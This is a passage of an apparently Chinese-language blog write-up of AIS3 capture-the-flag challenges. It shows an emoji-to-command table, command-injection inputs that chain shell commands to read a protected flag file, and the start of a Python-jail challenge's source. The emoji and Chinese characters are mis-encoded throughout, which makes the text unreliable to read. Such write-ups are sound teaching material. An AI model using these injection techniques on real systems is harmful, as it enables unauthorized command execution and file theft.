class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¨&quot;</span>: <span class="string">&quot;koala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ®&quot;</span>: <span class="string">&quot;cow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ·&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ½&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ§&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ£&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦†&quot;</span>: <span class="string">&quot;duck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦…&quot;</span>: <span class="string">&quot;eagle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‰&quot;</span>: <span class="string">&quot;owl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‡&quot;</span>: <span class="string">&quot;bat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸº&quot;</span>: <span class="string">&quot;wolf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ—&quot;</span>: <span class="string">&quot;boar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ´&quot;</span>: <span class="string">&quot;horse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦„&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‹&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŒ&quot;</span>: <span class="string">&quot;snail&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸœ&quot;</span>: <span class="string">&quot;ant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦Ÿ&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦—&quot;</span>: <span class="string">&quot;cricket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•·ï¸&quot;</span>: <span class="string">&quot;spider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•¸ï¸&quot;</span>: <span class="string">&quot;spider web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‚&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lizard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦–&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦•&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;octopus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‘&quot;</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lobster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦€&quot;</span>: <span class="string">&quot;crab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ &quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ&quot;</span>: <span class="string">&quot;fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ³&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‹&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦ˆ&quot;</span>: <span class="string">&quot;shark&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŠ&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;leopard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦“&quot;</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦§&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦£&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;elephant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦›&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸª&quot;</span>: <span class="string">&quot;camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ«&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦’&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦˜&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¬&quot;</span>: <span class="string">&quot;bison&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¦&quot;</span>: <span class="string">&quot;otter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¡&quot;</span>: <span class="string">&quot;badger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—¼ï¸&quot;</span>: <span class="string">&quot;black square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—»ï¸&quot;</span>: <span class="string">&quot;white square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—¾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—½&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–ªï¸&quot;</span>: <span class="string">&quot;black small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–«ï¸&quot;</span>: <span class="string">&quot;white small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”·&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”º&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”»&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”½&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”˜&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âšª&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âš«&quot;</span>: <span class="string">&quot;black circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ &quot;</span>: <span class="string">&quot;orange circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”µ&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ£&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â­•&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…°ï¸&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…±ï¸&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…¾ï¸&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â„¹ï¸&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…¿ï¸&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â“‚ï¸&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;AB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†‘&quot;</span>: <span class="string">&quot;CL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†’&quot;</span>: <span class="string">&quot;COOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†“&quot;</span>: <span class="string">&quot;FREE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†”&quot;</span>: <span class="string">&quot;ID&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†•&quot;</span>: <span class="string">&quot;NEW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†–&quot;</span>: <span class="string">&quot;NG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†—&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†˜&quot;</span>: <span class="string">&quot;SOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†™&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†š&quot;</span>: <span class="string">&quot;VS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ãŠ—ï¸&quot;</span>: <span class="string">&quot;ç¥&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ãŠ™ï¸&quot;</span>: <span class="string">&quot;ç§˜&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆº&quot;</span>: <span class="string">&quot;ç‡Ÿ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¯&quot;</span>: <span class="string">&quot;æŒ‡&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‰&quot;</span>: <span class="string">&quot;å¾—&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¹&quot;</span>: <span class="string">&quot;å‰²&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆš&quot;</span>: <span class="string">&quot;ç„¡&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ²&quot;</span>: <span class="string">&quot;ç¦&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¸&quot;</span>: <span class="string">&quot;ç”³&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ´&quot;</span>: <span class="string">&quot;åˆ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ³&quot;</span>: <span class="string">&quot;ç©º&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆµ&quot;</span>: <span class="string">&quot;æ»¿&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¶&quot;</span>: <span class="string">&quot;æœ‰&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ·ï¸&quot;</span>: <span class="string">&quot;æœˆ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš—&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš•&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš™&quot;</span>: <span class="string">&quot;SUV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšŒ&quot;</span>: <span class="string">&quot;bus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;race car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš“&quot;</span>: <span class="string">&quot;police car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš‘&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš’&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;minibus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšš&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš›&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšœ&quot;</span>: <span class="string">&quot;tractor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›´&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš²&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›µ&quot;</span>: <span class="string">&quot;scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âœˆï¸&quot;</span>: <span class="string">&quot;airplane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš€&quot;</span>: <span class="string">&quot;rocket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â›µ&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš¤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›³ï¸&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â›´ï¸&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¥ï¸&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš¢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘¨&quot;</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘©&quot;</span>: <span class="string">&quot;woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘¶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ§“&quot;</span>: <span class="string">&quot;old man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘µ&quot;</span>: <span class="string">&quot;old woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’¿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“€&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“±&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’»&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–¥ï¸&quot;</span>: <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–¨ï¸&quot;</span>: <span class="string">&quot;printer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âŒ¨ï¸&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–±ï¸&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–²ï¸&quot;</span>: <span class="string">&quot;trackball&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•¹ï¸&quot;</span>: <span class="string">&quot;joystick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ—œï¸&quot;</span>: <span class="string">&quot;clamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’¾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’½&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜ï¸&quot;</span>: <span class="string">&quot;telephone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“Ÿ&quot;</span>: <span class="string">&quot;pager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“º&quot;</span>: <span class="string">&quot;television&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“»&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™ï¸&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšï¸&quot;</span>: <span class="string">&quot;level slider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›ï¸&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â°&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•°ï¸&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âŒš&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“¡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”‹&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”Œ&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš©&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â“¿&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¶&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â·&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¸&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¹&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âº&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â»&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¼&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â½&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¾&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¿&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â­&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â•&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âœ–ï¸&quot;</span>: <span class="string">&quot;Ã—&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—&quot;</span>: <span class="string">&quot;Ã·&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;cat: flag: Is a directory</span><br><span class="line">cat: templates: Is a directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç¾åœ¨æˆ‘å€‘å¾—åˆ°ä¸€å€‹jsonæœ‰æ‰€æœ‰æŒ‡ä»¤çš„å°ç…§è¡¨ï¼Œä¸¦ä¸”å¯ä»¥çŸ¥é“flagæ‡‰è©²æ˜¯åœ¨ <code>flag</code> çš„è³‡æ–™å¤¾ã€‚</p>
<p>å˜—è©¦ <code>cat</code> flag è³‡æ–™å¤¾è£¡é¢çš„æ±è¥¿ï¼Œå¯ä»¥å¾å‰›å‰› dump å‡ºä¾†çš„ json æ‰¾å¯ä»¥ç”¨çš„æŒ‡ä»¤ï¼Œé€™é‚Šä½¿ç”¨<code>;/</code>å’Œ<code>:|</code>åˆ‡å‰²æŒ‡ä»¤ï¼Œå›å‚³çš„çµæœä¼¼ä¹æ˜¯ä¸€å€‹ python file</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸ± â­ <span class="comment">#cd flag;/:|</span></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag-printer.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>åŸ·è¡Œpythonï¼Œget flag<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸâ¸ ğŸš©â–ğŸ–¨ï¸â­</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>AIS3{ğŸ«µğŸª¡ğŸ‰ğŸ¤™ğŸ¤™ğŸ¤™ğŸ‘‰ğŸ‘‰ğŸš©ğŸ‘ˆğŸ‘ˆ}</p>
</blockquote>
<h2 id="Can-you-describe-Pyjail"><a href="#Can-you-describe-Pyjail" class="headerlink" title="Can you describe Pyjail?"></a>Can you describe Pyjail?</h2><blockquote>
<p>Yet another ğŸ â›“ï¸.<br>nc chals1.ais3.org 48763<br>Author: Vincent55</p>
</blockquote>
<p>é€™é¡Œä¸æ˜¯æˆ‘å‡ºçš„ï¼Œä½†æ˜¯ Vincent å¤§ä½¬å‡ºçš„é¡Œç›®é‚„æ˜¯è¦æ§å ´ä¸€ä¸‹</p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>çœ‹source codeå¯ä»¥çŸ¥é“æ˜¯å¾ˆç´”çš„pyjailï¼Œåœ¨ <code>safe_eval</code> è£¡é¢å°±æŠŠè©² ban çš„éƒ½ ban å…‰äº†</p>
<p><del>è·Ÿå‰é¢é‚£é¡Œ evil calculator æ¯”èµ·ä¾† calculator ä¸€é»éƒ½ä¸ evil</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> safe_eval <span class="keyword">import</span> safe_eval</span><br><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> getdoc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Desc</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Welcome to my ğŸ â›“ï¸</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, objname, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;conf&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">desc_helper</span>(<span class="params">self, name</span>):</span><br><span class="line">        origin = <span class="built_in">getattr</span>(<span class="built_in">type</span>, name)</span><br><span class="line">        <span class="keyword">if</span> origin == <span class="built_in">type</span>.__getattribute__:</span><br><span class="line">            <span class="keyword">raise</span> NameError(</span><br><span class="line">                <span class="string">&quot;Access to forbidden name %r (%r)&quot;</span> % (name, <span class="string">&quot;__getattribute__&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="variable language_">self</span>.helper = origin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    desc = Desc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line">test.desc = <span class="string">&quot;flag&#123;fakeflag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Just a tricky way to print a welcome message, or maybe a hint :/</span></span><br><span class="line"><span class="comment"># You can just `print(getdoc(Desc))`</span></span><br><span class="line"><span class="comment"># This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.</span></span><br><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span 